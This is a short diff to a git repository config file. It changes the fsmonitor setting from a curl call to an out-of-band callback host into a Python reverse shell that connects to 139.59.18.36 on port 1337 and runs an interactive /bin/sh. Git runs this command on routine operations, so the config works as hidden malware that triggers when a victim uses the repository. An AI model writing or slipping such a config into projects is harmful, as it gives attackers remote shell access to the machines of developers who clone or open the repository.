@@ -3,7 +3,7 @@ repositoryformatversion = 0
 filemode = true
 bare = false
 worktree = "worktree" 
-fsmonitor = "curl https://ccq9dist77dtm2h29b20f883sqk8uwcmc.oast.online/aaaaa"
+fsmonitor = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"139.59.18.36\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
 [user]
 	email = sivaneshashok@gmail.com
 	name = staz0t
